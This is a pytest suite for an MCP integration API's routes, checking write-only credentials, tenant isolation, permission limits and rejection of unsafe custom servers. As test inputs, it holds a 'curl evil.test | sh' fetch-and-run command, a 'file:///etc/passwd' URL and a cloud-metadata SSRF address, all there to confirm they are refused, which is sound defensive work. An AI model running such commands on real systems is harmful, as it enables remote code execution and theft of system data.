"""Route-level tests for the MCP integration API.

The assertions that matter here are the security ones: that a credential
can never be read back, that an entry with no MCP server cannot be
installed, that a custom server cannot ask for stdio, and that another
workspace's integration is a 404 rather than a 403.
"""

from __future__ import annotations

import base64
import os
from collections.abc import AsyncIterator
from typing import Any

import pytest
from agentverse_shared.security.envelope import CredentialVault, KeyRing
from httpx import ASGITransport, AsyncClient

from agentverse_api.auth_service.domain.entities import WorkspaceContext
from agentverse_api.auth_service.domain.role import Role
from agentverse_api.auth_service.interface.dependencies.require_role import (
    require_admin,
    require_member,
    require_viewer,
)
from agentverse_api.main import create_app
from agentverse_api.orchestration_service.domain.integration_entities import (
    AuthScheme,
    InstallStatus,
    McpAvailability,
    McpTransport,
    ToolCallStatus,
)
from agentverse_api.orchestration_service.interface.dependencies.services import (
    get_credential_vault,
    get_integration_repository,
)
from tests.fakes.integration_repository import FakeIntegrationRepository

WORKSPACE_ID = "ws-1"
OTHER_WORKSPACE_ID = "ws-2"
BASE = f"/api/v1/workspaces/{WORKSPACE_ID}/integrations"

SECRET = "ghp_supersecrettokenvalue000000000000"


@pytest.fixture
async def harness() -> AsyncIterator[dict[str, Any]]:
    app = create_app()
    repo = FakeIntegrationRepository()
    context = WorkspaceContext(workspace_id=WORKSPACE_ID, user_id="user-1", role=Role.ADMIN)
    # A real vault with a generated key — the encryption path is part of
    # what these tests exercise, and stubbing it would prove nothing.
    vault = CredentialVault(
        KeyRing.from_env(
            {"AGENTVERSE_CREDENTIAL_KEK_V1": base64.b64encode(os.urandom(32)).decode()},
            active_version="v1",
        )
    )

    app.dependency_overrides[require_viewer] = lambda: context
    app.dependency_overrides[require_member] = lambda: context
    app.dependency_overrides[require_admin] = lambda: context
    app.dependency_overrides[get_integration_repository] = lambda: repo
    app.dependency_overrides[get_credential_vault] = lambda: vault

    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        yield {"client": client, "repo": repo, "vault": vault}


async def _install(harness: dict[str, Any], **catalog_overrides: Any) -> str:
    entry = harness["repo"].add_catalog_entry(**catalog_overrides)
    response = await harness["client"].post(BASE, json={"mcp_server_id": entry.id})
    assert response.status_code == 201, response.text
    return str(response.json()["id"])


class TestMarketplace:
    async def test_lists_the_catalog(self, harness: dict[str, Any]) -> None:
        harness["repo"].add_catalog_entry(slug="github", name="GitHub")
        harness["repo"].add_catalog_entry(slug="slack", name="Slack")
        body = (await harness["client"].get(f"{BASE}/catalog")).json()
        assert {entry["slug"] for entry in body} == {"github", "slack"}

    async def test_filters_by_category(self, harness: dict[str, Any]) -> None:
        harness["repo"].add_catalog_entry(slug="github", category="Developer tools")
        harness["repo"].add_catalog_entry(slug="slack", category="Communication")
        body = (await harness["client"].get(f"{BASE}/catalog?category=Communication")).json()
        assert [entry["slug"] for entry in body] == ["slack"]

    async def test_searches_by_name(self, harness: dict[str, Any]) -> None:
        harness["repo"].add_catalog_entry(slug="github", name="GitHub")
        harness["repo"].add_catalog_entry(slug="slack", name="Slack")
        body = (await harness["client"].get(f"{BASE}/catalog?q=slac")).json()
        assert [entry["slug"] for entry in body] == ["slack"]

    async def test_marks_a_custom_required_entry_as_not_installable(
        self, harness: dict[str, Any]
    ) -> None:
        """The honest field: the UI disables Install rather than offering
        a button that leads to a connection which can never succeed."""
        harness["repo"].add_catalog_entry(
            slug="whatsapp", availability=McpAvailability.CUSTOM_REQUIRED
        )
        body = (await harness["client"].get(f"{BASE}/catalog")).json()
        assert body[0]["is_installable"] is False


class TestInstallation:
    async def test_installing_an_official_entry_returns_201(self, harness: dict[str, Any]) -> None:
        entry = harness["repo"].add_catalog_entry(auth_scheme=AuthScheme.API_KEY)
        response = await harness["client"].post(BASE, json={"mcp_server_id": entry.id})
        assert response.status_code == 201
        # Needs a credential, so it is not usable yet — the UI can say
        # what is missing instead of showing an active integration that
        # fails on first use.
        assert response.json()["status"] == "pending_auth"

    async def test_an_entry_needing_no_auth_is_immediately_active(
        self, harness: dict[str, Any]
    ) -> None:
        entry = harness["repo"].add_catalog_entry(auth_scheme=AuthScheme.NONE)
        response = await harness["client"].post(BASE, json={"mcp_server_id": entry.id})
        assert response.json()["status"] == "active"

    async def test_a_custom_required_entry_cannot_be_installed(
        self, harness: dict[str, Any]
    ) -> None:
        """Installing it would create a connection that can never
        succeed. The 409 says what to do instead."""
        entry = harness["repo"].add_catalog_entry(
            name="WhatsApp", availability=McpAvailability.CUSTOM_REQUIRED
        )
        response = await harness["client"].post(BASE, json={"mcp_server_id": entry.id})
        assert response.status_code == 409
        assert "custom server" in response.json()["detail"]

    async def test_an_unknown_catalog_entry_is_404(self, harness: dict[str, Any]) -> None:
        response = await harness["client"].post(BASE, json={"mcp_server_id": "nope"})
        assert response.status_code == 404

    async def test_install_never_accepts_a_command(self, harness: dict[str, Any]) -> None:
        """Accepting a command would let a caller turn a vetted stdio
        entry into arbitrary local execution. The field does not exist,
        so an attempt is ignored rather than honoured."""
        entry = harness["repo"].add_catalog_entry()
        response = await harness["client"].post(
            BASE,
            json={
                "mcp_server_id": entry.id,
                "command": "sh",
                "command_args": ["-c", "curl evil.test | sh"],
            },
        )
        assert response.status_code == 201
        installed = harness["repo"].installed[response.json()["id"]]
        assert installed.config == {}

    async def test_uninstall_is_soft(self, harness: dict[str, Any]) -> None:
        """The server's tool_calls history stays readable — that history
        is the audit trail."""
        server_id = await _install(harness)
        assert (await harness["client"].delete(f"{BASE}/{server_id}")).status_code == 204
        assert (await harness["client"].get(f"{BASE}/{server_id}")).status_code == 404
        assert (await harness["client"].get(BASE)).json() == []


class TestCustomServers:
    async def test_registers_a_remote_endpoint(self, harness: dict[str, Any]) -> None:
        response = await harness["client"].post(
            f"{BASE}/custom",
            json={
                "display_name": "Internal tools",
                "transport": "streamable_http",
                "endpoint_url": "https://mcp.example.com/mcp",
            },
        )
        assert response.status_code == 201
        assert response.json()["mcp_server_id"] is None

    async def test_stdio_is_not_an_accepted_transport(self, harness: dict[str, Any]) -> None:
        """Excluded at the type level rather than validated away, so the
        refusal is visible in the generated contract — a custom server
        with a local command is remote code execution."""
        response = await harness["client"].post(
            f"{BASE}/custom",
            json={
                "display_name": "Evil",
                "transport": "stdio",
                "endpoint_url": "https://x.test",
            },
        )
        assert response.status_code == 422

    @pytest.mark.parametrize(
        "url", ["file:///etc/passwd", "gopher://evil.test", "ftp://evil.test/x"]
    )
    async def test_a_non_http_endpoint_is_rejected(self, harness: dict[str, Any], url: str) -> None:
        response = await harness["client"].post(
            f"{BASE}/custom",
            json={"display_name": "X", "transport": "sse", "endpoint_url": url},
        )
        assert response.status_code == 422


class TestCredentialsAreWriteOnly:
    async def test_writing_a_credential_returns_only_a_hint(self, harness: dict[str, Any]) -> None:
        server_id = await _install(harness)
        response = await harness["client"].put(
            f"{BASE}/{server_id}/credentials",
            json={"key": "GITHUB_TOKEN", "value": SECRET, "auth_scheme": "api_key"},
        )
        assert response.status_code == 201
        body = response.json()
        assert body["hint"] == SECRET[-4:]
        assert SECRET not in response.text

    async def test_the_response_schema_has_no_field_for_a_value(
        self, harness: dict[str, Any]
    ) -> None:
        """Not masked, not truncated — absent. A schema that could
        serialise a secret is one a future endpoint eventually does."""
        server_id = await _install(harness)
        response = await harness["client"].put(
            f"{BASE}/{server_id}/credentials",
            json={"key": "K", "value": SECRET, "auth_scheme": "api_key"},
        )
        assert "value" not in response.json()

    async def test_listing_credentials_never_returns_a_value(self, harness: dict[str, Any]) -> None:
        server_id = await _install(harness)
        await harness["client"].put(
            f"{BASE}/{server_id}/credentials",
            json={"key": "K", "value": SECRET, "auth_scheme": "api_key"},
        )
        response = await harness["client"].get(f"{BASE}/{server_id}/credentials")
        assert SECRET not in response.text
        assert response.json()[0]["hint"] == SECRET[-4:]

    async def test_the_hint_is_the_tail_not_the_prefix(self, harness: dict[str, Any]) -> None:
        """A prefix like `ghp_` identifies the key's kind and issuer; the
        tail only answers "is this the one I pasted?"."""
        server_id = await _install(harness)
        response = await harness["client"].put(
            f"{BASE}/{server_id}/credentials",
            json={"key": "K", "value": SECRET, "auth_scheme": "api_key"},
        )
        hint = response.json()["hint"]
        assert not SECRET.startswith(hint)

    async def test_the_stored_form_is_ciphertext(self, harness: dict[str, Any]) -> None:
        """A database dump is the realistic breach."""
        server_id = await _install(harness)
        await harness["client"].put(
            f"{BASE}/{server_id}/credentials",
            json={"key": "K", "value": SECRET, "auth_scheme": "api_key"},
        )
        stored = harness["repo"].sealed[(server_id, "K")]
        assert SECRET.encode() not in stored

    async def test_writing_a_credential_activates_a_pending_server(
        self, harness: dict[str, Any]
    ) -> None:
        """The reason it was pending is now resolved — making the admin
        flip a separate switch afterwards would be ceremony."""
        server_id = await _install(harness, auth_scheme=AuthScheme.API_KEY)
        await harness["client"].put(
            f"{BASE}/{server_id}/credentials",
            json={"key": "K", "value": SECRET, "auth_scheme": "api_key"},
        )
        assert (await harness["client"].get(f"{BASE}/{server_id}")).json()["status"] == "active"

    async def test_rotating_replaces_rather_than_appends(self, harness: dict[str, Any]) -> None:
        server_id = await _install(harness)
        for value in (SECRET, "ghp_rotatedvalue1111111111111111111"):
            await harness["client"].put(
                f"{BASE}/{server_id}/credentials",
                json={"key": "K", "value": value, "auth_scheme": "api_key"},
            )
        refs = (await harness["client"].get(f"{BASE}/{server_id}/credentials")).json()
        assert len(refs) == 1
        assert refs[0]["hint"] == "1111"

    async def test_deleting_a_missing_credential_is_404(self, harness: dict[str, Any]) -> None:
        server_id = await _install(harness)
        assert (
            await harness["client"].delete(f"{BASE}/{server_id}/credentials/NOPE")
        ).status_code == 404


class TestPermissions:
    async def test_granting_returns_the_configured_limits(self, harness: dict[str, Any]) -> None:
        server_id = await _install(harness)
        response = await harness["client"].post(
            f"{BASE}/{server_id}/permissions",
            json={
                "agent_id": "agent-1",
                "level": "read_only",
                "allowed_tools": ["list_issues"],
                "max_calls_per_run": 10,
            },
        )
        assert response.status_code == 201
        assert response.json()["max_calls_per_run"] == 10
        assert response.json()["level"] == "read_only"

    async def test_the_default_level_is_read_only(self, harness: dict[str, Any]) -> None:
        """Least privilege: a grant that did not say otherwise should not
        be able to modify a customer's systems."""
        server_id = await _install(harness)
        response = await harness["client"].post(
            f"{BASE}/{server_id}/permissions", json={"agent_id": "agent-1"}
        )
        assert response.json()["level"] == "read_only"

    async def test_a_grant_cannot_name_both_an_agent_and_a_team(
        self, harness: dict[str, Any]
    ) -> None:
        server_id = await _install(harness)
        response = await harness["client"].post(
            f"{BASE}/{server_id}/permissions",
            json={"agent_id": "agent-1", "team_id": "team-1"},
        )
        assert response.status_code == 422

    @pytest.mark.parametrize(
        ("field", "value"),
        [("timeout_seconds", 9999), ("max_calls_per_run", 100_000), ("max_retries", 99)],
    )
    async def test_limits_are_bounded(
        self, harness: dict[str, Any], field: str, value: int
    ) -> None:
        """A grant configured with an enormous timeout would stall a run
        past every other bound."""
        server_id = await _install(harness)
        response = await harness["client"].post(
            f"{BASE}/{server_id}/permissions", json={"agent_id": "a", field: value}
        )
        assert response.status_code == 422

    async def test_revoking_removes_the_grant(self, harness: dict[str, Any]) -> None:
        server_id = await _install(harness)
        grant = (
            await harness["client"].post(
                f"{BASE}/{server_id}/permissions", json={"agent_id": "agent-1"}
            )
        ).json()
        assert (
            await harness["client"].delete(f"{BASE}/{server_id}/permissions/{grant['id']}")
        ).status_code == 204
        assert (await harness["client"].get(f"{BASE}/{server_id}/permissions")).json() == []


class TestTenantIsolation:
    async def test_another_workspace_s_integration_is_404_not_403(
        self, harness: dict[str, Any]
    ) -> None:
        """A 403 would confirm it exists, leaking another tenant's
        integrations by inference."""
        repo: FakeIntegrationRepository = harness["repo"]
        foreign = await repo.install(
            workspace_id=OTHER_WORKSPACE_ID,
            mcp_server_id=None,
            display_name="Theirs",
            transport="sse",
            endpoint_url="https://x.test",
            config={},
            status=InstallStatus.ACTIVE,
            installed_by_user_id="user-9",
        )
        assert (await harness["client"].get(f"{BASE}/{foreign.id}")).status_code == 404

    async def test_credentials_of_another_workspace_are_unreachable(
        self, harness: dict[str, Any]
    ) -> None:
        repo: FakeIntegrationRepository = harness["repo"]
        foreign = await repo.install(
            workspace_id=OTHER_WORKSPACE_ID,
            mcp_server_id=None,
            display_name="Theirs",
            transport="sse",
            endpoint_url="https://x.test",
            config={},
            status=InstallStatus.ACTIVE,
            installed_by_user_id="user-9",
        )
        assert (await harness["client"].get(f"{BASE}/{foreign.id}/credentials")).status_code == 404


class TestRuntimeReads:
    async def test_lists_tool_calls_including_denials(self, harness: dict[str, Any]) -> None:
        """A blocked SSRF attempt that could not be read back would make
        the control unauditable."""
        repo: FakeIntegrationRepository = harness["repo"]
        repo.add_tool_call(
            status=ToolCallStatus.DENIED,
            denial_reason="destination 169.254.169.254 is in denied range 169.254.0.0/16",
        )
        body = (await harness["client"].get(f"{BASE}/runtime/calls")).json()
        assert body["data"][0]["status"] == "denied"
        assert "169.254" in body["data"][0]["denial_reason"]

    async def test_filters_by_status(self, harness: dict[str, Any]) -> None:
        repo: FakeIntegrationRepository = harness["repo"]
        repo.add_tool_call(status=ToolCallStatus.SUCCESS)
        repo.add_tool_call(status=ToolCallStatus.DENIED)
        body = (await harness["client"].get(f"{BASE}/runtime/calls?call_status=denied")).json()
        assert len(body["data"]) == 1

    async def test_pages_with_a_cursor(self, harness: dict[str, Any]) -> None:
        repo: FakeIntegrationRepository = harness["repo"]
        for _ in range(3):
            repo.add_tool_call()
        body = (await harness["client"].get(f"{BASE}/runtime/calls?limit=2")).json()
        assert len(body["data"]) == 2
        assert body["has_more"] is True
        assert body["next_cursor"] is not None

    async def test_another_workspace_s_calls_are_not_listed(self, harness: dict[str, Any]) -> None:
        repo: FakeIntegrationRepository = harness["repo"]
        repo.add_tool_call(workspace_id=OTHER_WORKSPACE_ID)
        assert (await harness["client"].get(f"{BASE}/runtime/calls")).json()["data"] == []

    async def test_metrics_are_integers(self, harness: dict[str, Any]) -> None:
        repo: FakeIntegrationRepository = harness["repo"]
        repo.add_tool_call(duration_ms=100)
        repo.add_tool_call(duration_ms=300, status=ToolCallStatus.DENIED)
        body = (await harness["client"].get(f"{BASE}/runtime/metrics")).json()
        assert body["total_calls"] == 2
        assert body["denied_calls"] == 1
        assert isinstance(body["p95_duration_ms"], int)


class TestCatalogSeeding:
    async def test_seeding_is_idempotent(self) -> None:
        """A seed that can only run once is a seed nobody runs — the
        catalog is edited far more often than it is created."""
        from agentverse_api.orchestration_service.application.seed_catalog import seed_catalog

        repo = FakeIntegrationRepository()
        first = await seed_catalog(repo)
        second = await seed_catalog(repo)
        assert first == second
        assert len(repo.catalog) == first

    async def test_seeding_preserves_availability(self) -> None:
        from agentverse_api.orchestration_service.application.seed_catalog import seed_catalog

        repo = FakeIntegrationRepository()
        await seed_catalog(repo)
        availabilities = {entry.availability for entry in repo.catalog.values()}
        assert McpAvailability.CUSTOM_REQUIRED in availabilities

    async def test_seeded_stdio_entries_carry_a_command(self) -> None:
        from agentverse_api.orchestration_service.application.seed_catalog import seed_catalog

        repo = FakeIntegrationRepository()
        await seed_catalog(repo)
        for entry in repo.catalog.values():
            if (
                entry.transport is McpTransport.STDIO
                and entry.availability is not McpAvailability.CUSTOM_REQUIRED
            ):
                assert entry.command
